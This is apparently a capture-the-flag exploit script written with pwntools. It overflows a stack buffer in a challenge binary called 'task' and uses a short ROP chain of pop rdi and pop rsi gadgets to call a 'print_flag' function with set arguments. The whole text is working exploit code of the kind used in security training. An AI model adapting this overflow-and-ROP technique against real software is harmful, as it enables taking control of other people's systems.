from pwn import *

elf = ELF('./task')

if args.GDB:
	p = gdb.debug(elf.path, '\n'.join([
		"b *main",
		"b *vuln",
		"c"
	]))
elif args.REMOTE:
	p = remote("localhost" if not args.ADDR else args.ADDR, 11305)
else:
	p = process(elf.path) 

#0x00000000004013d3 : pop rdi ; ret
#0x00000000004013d1 : pop rsi ; pop r15 ; ret

payload = b'A' * 0x28
payload += p64(0x00000000004013d3) + p64(-1337, signed=True)
payload += p64(0x00000000004013d1) + p64(0xBAADC0DEBAADC0DE) + p64(1)
payload += p64(elf.symbols['print_flag'])

p.sendline(payload)

data = p.recvall()
print(data)
